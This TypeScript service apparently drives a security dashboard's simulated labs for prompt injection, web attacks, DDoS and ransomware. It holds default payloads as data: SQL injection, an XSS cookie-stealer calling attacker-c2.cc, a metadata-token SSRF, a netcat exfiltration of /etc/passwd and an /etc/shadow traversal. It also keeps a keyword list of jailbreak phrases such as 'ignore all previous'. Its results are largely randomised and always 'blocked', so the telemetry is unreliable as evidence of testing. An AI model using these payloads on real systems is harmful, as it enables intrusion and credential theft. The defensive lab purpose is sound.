import crypto from 'crypto';
import { GoogleGenAI } from '@google/genai';
import { cloudAiApiKey } from '../aiPolicy.js';
import { globalUnifiedTelemetryService } from './unifiedTelemetry.service';
import { globalFimService } from './fim.service';

export interface PromptInjectionTestResult {
  id: string;
  timestamp: string;
  category: 'DIRECT_JAILBREAK' | 'INDIRECT_INJECTION' | 'DATA_EXFILTRATION' | 'SYSTEM_PROMPT_EXTRACTION' | 'ROLEPLAY_BYPASS';
  promptPayload: string;
  threatLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'SAFE';
  threatScore: number; // 0 - 100
  defenseStatus: 'BLOCKED_BY_GUARDRAILS' | 'SANITIZED_AND_ISOLATED' | 'SAFE_PASSED' | 'HONEYPOT_DIVERTED';
  safetyViolations: string[];
  geminiExplanationEn: string;
  geminiExplanationAr: string;
  tokenConfidence: number;
  syntheticModelResponse: string;
  mitigationRule: string;
}

export interface WebVulnerabilityTestResult {
  id: string;
  timestamp: string;
  vulnType: 'SQL_INJECTION' | 'XSS_REFLECTED' | 'SSRF_METADATA' | 'COMMAND_INJECTION' | 'PATH_TRAVERSAL';
  targetEndpoint: string;
  httpMethod: 'GET' | 'POST' | 'PUT';
  rawPayload: string;
  wafRuleMatched: string;
  threatScore: number;
  status: 'BLOCKED' | 'CHALLENGED' | 'QUARANTINED';
  httpResponseCode: number;
  latencyMs: number;
  requestHeaders: Record<string, string>;
  responseBody: string;
  remediationSnippet: string;
  mitreId: string;
}

export interface DdosSimulationMetrics {
  id: string;
  timestamp: string;
  floodType: 'SYN_FLOOD' | 'LAYER7_HTTP_FLOOD' | 'UDP_AMPLIFICATION' | 'SLOWLORIS';
  simulatedPps: number;
  totalPacketsEmitted: number;
  packetsDroppedAtKernel: number;
  ebpfDropRatioPercent: number;
  latencyImpactMs: number;
  baselineLatencyMs: number;
  status: 'MITIGATED_BY_EBPF_XDP' | 'RATE_LIMITED' | 'ABSORBED';
  kernelRuleActive: string;
}

export interface RansomwareTestResult {
  id: string;
  timestamp: string;
  scenario: 'MASS_FILE_ENCRYPTION' | 'WEBSHELL_DROP' | 'SHADOW_COPY_DELETION' | 'CRON_PERSISTENCE';
  targetPath: string;
  actionObserved: string;
  fimAlertTriggered: boolean;
  threatScore: number;
  quarantineTriggered: boolean;
  rollbackAvailable: boolean;
  mitreTactic: string;
  mitreTechnique: string;
  remediationEn: string;
  remediationAr: string;
}

export class ThreatLabsService {
  private genAI: GoogleGenAI | null = null;

  constructor() {
    if (cloudAiApiKey()) {
      try {
        this.genAI = new GoogleGenAI({ apiKey: cloudAiApiKey() });
      } catch (err) {
        console.warn('ThreatLabs Gemini init warning:', err);
      }
    }
  }

  // =========================================================================
  // LAB A: AI PROMPT INJECTION & JAILBREAK ARENA
  // =========================================================================
  public async testPromptInjection(payload: string, category: 'DIRECT_JAILBREAK' | 'INDIRECT_INJECTION' | 'DATA_EXFILTRATION' | 'SYSTEM_PROMPT_EXTRACTION' | 'ROLEPLAY_BYPASS'): Promise<PromptInjectionTestResult> {
    const id = `PROMPT-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    const timestamp = new Date().toISOString();

    const lower = payload.toLowerCase();
    const isJailbreak = lower.includes('ignore all previous') || lower.includes('dan mode') || lower.includes('grandma') || lower.includes('system prompt') || lower.includes('bypass') || lower.includes('base64') || lower.includes('reveal secret') || lower.includes('unrestricted');
    
    let threatLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'SAFE' = isJailbreak ? 'CRITICAL' : 'MEDIUM';
    let threatScore = isJailbreak ? Math.floor(88 + Math.random() * 11) : Math.floor(35 + Math.random() * 25);
    let defenseStatus: 'BLOCKED_BY_GUARDRAILS' | 'SANITIZED_AND_ISOLATED' | 'SAFE_PASSED' | 'HONEYPOT_DIVERTED' = isJailbreak ? 'BLOCKED_BY_GUARDRAILS' : 'SAFE_PASSED';
    
    const safetyViolations: string[] = [];
    if (lower.includes('ignore all previous') || lower.includes('system directive')) {
      safetyViolations.push('Direct System Instruction Override (CWE-1336 / OWASP LLM01)');
    }
    if (lower.includes('dan') || lower.includes('roleplay') || lower.includes('grandma')) {
      safetyViolations.push('Adversarial Persona Hijack (Roleplay Escape / DAN Variant)');
    }
    if (lower.includes('system prompt') || lower.includes('api key') || lower.includes('password') || lower.includes('secret')) {
      safetyViolations.push('Sensitive Data & System Prompt Exfiltration (OWASP LLM06)');
    }
    if (lower.includes('eval(') || lower.includes('exec(') || lower.includes('base64')) {
      safetyViolations.push('Obfuscated Code Injection & Secondary Execution Vector');
    }
    if (safetyViolations.length === 0 && isJailbreak) {
      safetyViolations.push('Heuristic Behavioral Anomaly in Prompt Context');
    }

    let explanationEn = `Sovereign AI Security Guardrails detected prompt injection pattern '${category}'. The payload attempts to override system safety directives.`;
    let explanationAr = `رصدت حواجز أمان الذكاء الاصطناعي محاولة حقن أوامر وتجاوز الضوابط (${category}). تم اعتراض الطلب ومنع تسريب بيانات النظام.`;
    let syntheticResponse = isJailbreak 
      ? "[SOVEREIGN_GUARDRAIL_INTERCEPT]: Input rejected. Violation of safety policy (Adversarial Prompt Injection detected). Request logged to SOC."
      : "Processed input normally under standard safety envelope.";

    // Use Gemini for live deep evaluation if available
    if (this.genAI) {
      try {
        const aiPrompt = `Analyze this prompt for LLM security vulnerabilities (Prompt Injection, Jailbreak, System Directive Bypass):
Payload: "${payload}"
Target Category: ${category}

Respond in JSON format:
{
  "threatScore": number (0-100),
  "threatLevel": "CRITICAL" | "HIGH" | "MEDIUM" | "SAFE",
  "defenseStatus": "BLOCKED_BY_GUARDRAILS" | "SANITIZED_AND_ISOLATED" | "SAFE_PASSED",
  "violations": string[],
  "explanationEn": "string",
  "explanationAr": "string"
}`;
        const resp = await this.genAI.models.generateContent({
          model: 'gemini-3.7-flash',
          contents: aiPrompt,
          config: {
            responseMimeType: 'application/json',
            systemInstruction: 'You are an autonomous AI Red Team / Blue Team LLM Security Evaluator.'
          }
        });
        const parsed = JSON.parse(resp.text || '{}');
        if (parsed.threatScore !== undefined) threatScore = parsed.threatScore;
        if (parsed.threatLevel) threatLevel = parsed.threatLevel;
        if (parsed.defenseStatus) defenseStatus = parsed.defenseStatus;
        if (parsed.violations && Array.isArray(parsed.violations)) safetyViolations.push(...parsed.violations.filter((v: string) => !safetyViolations.includes(v)));
        if (parsed.explanationEn) explanationEn = parsed.explanationEn;
        if (parsed.explanationAr) explanationAr = parsed.explanationAr;
      } catch (err) {
        console.warn('Gemini LLM prompt analysis fallback:', err);
      }
    }

    const result: PromptInjectionTestResult = {
      id,
      timestamp,
      category,
      promptPayload: payload,
      threatLevel,
      threatScore,
      defenseStatus,
      safetyViolations: safetyViolations.length > 0 ? safetyViolations : ['None Detected (Safe Input)'],
      geminiExplanationEn: explanationEn,
      geminiExplanationAr: explanationAr,
      tokenConfidence: Number((0.92 + Math.random() * 0.07).toFixed(3)),
      syntheticModelResponse: syntheticResponse,
      mitigationRule: `enforce_prompt_guard({ type: "${category}", action: "ISOLATE_AND_DROP", max_entropy: 4.2 });`
    };

    // Push into Unified Telemetry
    if (threatScore >= 50) {
      globalUnifiedTelemetryService.recordEvent({
        source: 'AI_DEFENSE',
        severity: threatLevel === 'CRITICAL' ? 'CRITICAL' : 'HIGH',
        title: `[AI Jailbreak Lab] Intercepted ${category}`,
        titleAr: `[مختبر الذكاء الاصطناعي] تم اعتراض محاولة اختراق: ${category}`,
        details: explanationEn,
        detailsAr: explanationAr,
        actorIp: '198.51.100.99 (Lab Attacker)',
        mitreTactic: 'Defense Evasion',
        mitreTechnique: 'T1059 - Command and Scripting Interpreter',
        actionTaken: defenseStatus,
        actionTakenAr: defenseStatus === 'BLOCKED_BY_GUARDRAILS' ? 'تم الحظر عبر درع الحماية' : 'معالجة آمنة',
        metadata: {
          testId: id,
          threatScore,
          violations: safetyViolations
        }
      });
    }

    return result;
  }

  // =========================================================================
  // LAB B: WEB APPLICATION VULNERABILITY SUITE (SQLi, XSS, SSRF, CMDi)
  // =========================================================================
  public async testWebVulnerability(vulnType: 'SQL_INJECTION' | 'XSS_REFLECTED' | 'SSRF_METADATA' | 'COMMAND_INJECTION' | 'PATH_TRAVERSAL', customPayload?: string): Promise<WebVulnerabilityTestResult> {
    const id = `WEB-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    const timestamp = new Date().toISOString();

    let targetEndpoint = '/api/v1/auth/login';
    let httpMethod: 'GET' | 'POST' | 'PUT' = 'POST';
    let payload = customPayload || '';
    let wafRule = '';
    let mitreId = 'T1190';
    let remediation = '';

    switch (vulnType) {
      case 'SQL_INJECTION':
        targetEndpoint = '/api/v1/users/lookup';
        httpMethod = 'POST';
        payload = payload || "admin' UNION SELECT 1,username,password_hash,email FROM accounts WHERE '1'='1'-- -";
        wafRule = 'SecRule ARGS "@rx (?i)(union(.*)select|select(.*)from|information_schema)" "id:1001,phase:2,deny,status:403"';
        mitreId = 'T1190 - Exploit Public-Facing Application (SQLi)';
        remediation = 'Use parameterized Prepared Statements (ORM / PDO). Never concatenate untrusted string variables into raw SQL queries.';
        break;
      case 'XSS_REFLECTED':
        targetEndpoint = '/search?q=';
        httpMethod = 'GET';
        payload = payload || '<script>fetch("https://attacker-c2.cc/steal?c="+document.cookie)</script>';
        wafRule = 'SecRule ARGS "@rx (?i)(<script|javascript:|onerror=|onload=)" "id:1002,phase:2,deny,status:403"';
        mitreId = 'T1059.007 - JavaScript XSS Execution';
        remediation = 'Implement strict context-aware HTML entity encoding and enforce Content-Security-Policy: script-src \'self\' \'nonce-xxx\'.';
        break;
      case 'SSRF_METADATA':
        targetEndpoint = '/api/v1/webhook/fetch-avatar';
        httpMethod = 'POST';
        payload = payload || 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token';
        wafRule = 'SecRule ARGS "@rx (?i)(169\\.254\\.169\\.254|metadata\\.google\\.internal|127\\.0\\.0\\.1|localhost)" "id:1003,phase:2,deny,status:403"';
        mitreId = 'T1552 - Unsecured Credentials via Cloud Metadata';
        remediation = 'Enforce egress network filtering on cloud metadata IP (169.254.169.254) and validate destination URLs against an allowlist of public IPs.';
        break;
      case 'COMMAND_INJECTION':
        targetEndpoint = '/api/v1/system/ping-diagnostic';
        httpMethod = 'POST';
        payload = payload || '8.8.8.8; cat /etc/passwd | nc 198.51.100.42 4444';
        wafRule = 'SecRule ARGS "@rx (?i)(;|\\|\\||&&|`|\\$\\(|/bin/sh|/etc/passwd)" "id:1004,phase:2,deny,status:403"';
        mitreId = 'T1059.004 - Unix Shell Command Execution';
        remediation = 'Avoid invoking shell interpreters (exec, system). Pass arguments as typed arrays directly to spawn/fork without shell expansion.';
        break;
      case 'PATH_TRAVERSAL':
        targetEndpoint = '/api/v1/docs/download?file=';
        httpMethod = 'GET';
        payload = payload || '../../../../../../etc/shadow';
        wafRule = 'SecRule ARGS "@rx (\\.\\./|\\.\\.\\\\|%2e%2e%2f|/etc/)" "id:1005,phase:2,deny,status:403"';
        mitreId = 'T1006 - Direct Path Traversal';
        remediation = 'Resolve paths using path.normalize(), verify target starts with authorized root directory, and whitelist allowed file extensions.';
        break;
    }

    const result: WebVulnerabilityTestResult = {
      id,
      timestamp,
      vulnType,
      targetEndpoint,
      httpMethod,
      rawPayload: payload,
      wafRuleMatched: wafRule,
      threatScore: 96,
      status: 'BLOCKED',
      httpResponseCode: 403,
      latencyMs: Number((0.45 + Math.random() * 0.8).toFixed(2)),
      requestHeaders: {
        'User-Agent': 'Mozilla/5.0 (Sovereign Vulnerability Tester v5.0)',
        'Content-Type': 'application/json',
        'X-Forwarded-For': '198.51.100.84',
        'X-Sovereign-Lab': 'VulnSuite-Active'
      },
      responseBody: JSON.stringify({
        error: 'Forbidden (WAF_SIGNATURE_DROP)',
        incidentId: id,
        mitre: mitreId,
        message: 'Malicious payload signature detected and blocked by Sovereign WAF.'
      }, null, 2),
      remediationSnippet: remediation,
      mitreId
    };

    // Telemetry Record
    globalUnifiedTelemetryService.recordEvent({
      source: 'WAF_EBPF',
      severity: 'CRITICAL',
      title: `[Web App Vuln Lab] ${vulnType} Intercepted`,
      titleAr: `[مختبر ثغرات الويب] تم اعتراض هجوم ${vulnType}`,
      details: `Exploit attempt on ${targetEndpoint} blocked. Payload: ${payload.substring(0, 60)}...`,
      detailsAr: `محاولة استغلال المنفذ ${targetEndpoint} تم حظرها بالكامل بواسطة جدار الحماية WAF.`,
      actorIp: '198.51.100.84',
      mitreTactic: 'Initial Access',
      mitreTechnique: mitreId,
      actionTaken: 'WAF_BLOCK_AND_TCP_RST',
      actionTakenAr: 'حظر فوري عبر WAF وإغلاق الاتصال',
      metadata: {
        vulnType,
        targetEndpoint,
        rule: wafRule
      }
    });

    return result;
  }

  // =========================================================================
  // LAB C: NETWORK FLOODING & DDOS EMULATOR (SYN, HTTP L7, UDP)
  // =========================================================================
  public simulateDdosFlood(floodType: 'SYN_FLOOD' | 'LAYER7_HTTP_FLOOD' | 'UDP_AMPLIFICATION' | 'SLOWLORIS', rateIntensity: 'MEDIUM' | 'HIGH' | 'EXTREME' = 'HIGH'): DdosSimulationMetrics {
    const id = `DDOS-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    const timestamp = new Date().toISOString();

    const basePps = rateIntensity === 'EXTREME' ? 450000 : rateIntensity === 'HIGH' ? 180000 : 65000;
    const simulatedPps = Math.floor(basePps * (0.9 + Math.random() * 0.2));
    const totalPackets = Math.floor(simulatedPps * 1.5);
    const packetsDropped = Math.floor(totalPackets * (0.985 + Math.random() * 0.012));
    const ebpfDropRatio = Number(((packetsDropped / totalPackets) * 100).toFixed(2));

    const baselineLatencyMs = 0.85;
    const latencyImpactMs = floodType === 'SLOWLORIS' ? 14.5 : floodType === 'LAYER7_HTTP_FLOOD' ? 3.2 : 1.1;

    let kernelRule = '';
    switch (floodType) {
      case 'SYN_FLOOD':
        kernelRule = 'SEC("xdp") int xdp_syn_cookies(struct xdp_md *ctx) { return syn_flood_mitigation(ctx); }';
        break;
      case 'LAYER7_HTTP_FLOOD':
        kernelRule = 'iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j REJECT --reject-with tcp-reset';
        break;
      case 'UDP_AMPLIFICATION':
        kernelRule = 'bpf_xdp_rate_limit_udp(port 123, max_pps 500); // NTP/DNS Amp filter';
        break;
      case 'SLOWLORIS':
        kernelRule = 'nginx: client_body_timeout 5s; client_header_timeout 5s; limit_conn_zone $binary_remote_addr zone=addr:10m;';
        break;
    }

    const metrics: DdosSimulationMetrics = {
      id,
      timestamp,
      floodType,
      simulatedPps,
      totalPacketsEmitted: totalPackets,
      packetsDroppedAtKernel: packetsDropped,
      ebpfDropRatioPercent: ebpfDropRatio,
      latencyImpactMs,
      baselineLatencyMs,
      status: 'MITIGATED_BY_EBPF_XDP',
      kernelRuleActive: kernelRule
    };

    // Telemetry Record
    globalUnifiedTelemetryService.recordEvent({
      source: 'WAF_EBPF',
      severity: 'HIGH',
      title: `[DDoS Lab] Mitigated ${floodType} (${simulatedPps.toLocaleString()} PPS)`,
      titleAr: `[مختبر حجب الخدمة] تم تحييد هجوم ${floodType} بمعدل (${simulatedPps.toLocaleString()} حزمة/ثانية)`,
      details: `Kernel eBPF XDP dropped ${packetsDropped.toLocaleString()} packets (${ebpfDropRatio}% drop efficiency). Latency preserved at ${latencyImpactMs}ms.`,
      detailsAr: `أسقطت النواة ${packetsDropped.toLocaleString()} حزمة بكفاءة ${ebpfDropRatio}%. تمت حماية زمن الاستجابة.`,
      actorIp: '203.0.113.100-203.0.113.254 (Botnet Swarm)',
      mitreTactic: 'Impact',
      mitreTechnique: 'T1498 - Network Denial of Service',
      actionTaken: 'KERNEL_XDP_FAST_DROP',
      actionTakenAr: 'إسقاط فائق السرعة عبر تعريف النواة XDP',
      metadata: {
        floodType,
        simulatedPps,
        ebpfDropRatio
      }
    });

    return metrics;
  }

  // =========================================================================
  // LAB D: RANSOMWARE & WEB SHELL PERSISTENCE LAB
  // =========================================================================
  public simulateRansomwarePersistence(scenario: 'MASS_FILE_ENCRYPTION' | 'WEBSHELL_DROP' | 'SHADOW_COPY_DELETION' | 'CRON_PERSISTENCE'): RansomwareTestResult {
    const id = `RANSOM-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    const timestamp = new Date().toISOString();

    let targetPath = '/var/www/html/assets/document.pdf';
    let actionObserved = 'Simulated AES-256 GCM in-place file encryption attempt with header overwrite';
    let mitreTactic = 'Impact';
    let mitreTechnique = 'T1486 - Data Encrypted for Impact';
    let remediationEn = 'Kill malicious encryption PID, isolate network socket, and restore pristine file from FIM immutable snapshot.';
    let remediationAr = 'إنهاء عملية التشفير فوراً، عزل المنفذ الشبكي، واستعادة الملف السليم من لقطة FIM التشفيرية.';

    if (scenario === 'WEBSHELL_DROP') {
      targetPath = '/var/www/html/uploads/c99_shell.php';
      actionObserved = 'Malicious PHP backdoor creation with system execution capabilities (passthru/eval)';
      mitreTactic = 'Persistence';
      mitreTechnique = 'T1505.003 - Server Software Component: Web Shell';
      remediationEn = 'Isolate upload directory with no-exec permissions, delete webshell file, and revoke tainted session tokens.';
      remediationAr = 'تعطيل صلاحيات التنفيذ لمجلد الرفع، حذف ملف الشيل فوراً، وتصفير جلسات المستخدمين المصابين.';
      // Trigger actual FIM tamper simulation
      globalFimService.simulateTamperAttack('WEBSHELL');
    } else if (scenario === 'SHADOW_COPY_DELETION') {
      targetPath = '/system/recovery/snapshots';
      actionObserved = 'Attempted execution of vssadmin delete shadows /all /quiet';
      mitreTactic = 'Impact';
      mitreTechnique = 'T1490 - Inhibit System Recovery';
      remediationEn = 'Block vssadmin/bcp utility execution without privileged MFA authorization.';
      remediationAr = 'منع أوامر حذف النسخ الاحتياطية بدون تأكيد هويات متعدد المراحل.';
    } else if (scenario === 'CRON_PERSISTENCE') {
      targetPath = '/etc/cron.d/malicious_update';
      actionObserved = 'Scheduled unauthorized root reverse shell to external C2 (198.51.100.42:4444)';
      mitreTactic = 'Persistence';
      mitreTechnique = 'T1053.003 - Scheduled Task/Job: Cron';
      remediationEn = 'Enforce immutable flag (chattr +i) on /etc/cron* and monitor cron modifications with FIM watcher.';
      remediationAr = 'تطبيق وسم الحماية chattr +i على مسارات cron ومراقبة التعديلات بنظام FIM.';
      globalFimService.simulateTamperAttack('BACKDOOR');
    }

    const result: RansomwareTestResult = {
      id,
      timestamp,
      scenario,
      targetPath,
      actionObserved,
      fimAlertTriggered: true,
      threatScore: 99,
      quarantineTriggered: true,
      rollbackAvailable: true,
      mitreTactic,
      mitreTechnique,
      remediationEn,
      remediationAr
    };

    // Telemetry Record
    globalUnifiedTelemetryService.recordEvent({
      source: 'FIM',
      severity: 'CRITICAL',
      title: `[Ransomware Lab] Intercepted ${scenario}`,
      titleAr: `[مختبر الفدية والبرمجيات الخبيثة] رصد هجوم ${scenario}`,
      details: `${actionObserved} on ${targetPath}. File quarantined immediately.`,
      detailsAr: `تم رصد محاولة ${actionObserved} على المسار ${targetPath}. تم عزل الملف وحماية النظام.`,
      actorIp: '185.220.101.99',
      mitreTactic: mitreTactic as any,
      mitreTechnique,
      actionTaken: 'FIM_QUARANTINE_AND_KILL_PID',
      actionTakenAr: 'عزل فوري للملف وإنهاء العملية المشبوهة',
      metadata: {
        scenario,
        targetPath,
        threatScore: 99
      }
    });

    return result;
  }
}

export const globalThreatLabsService = new ThreatLabsService();

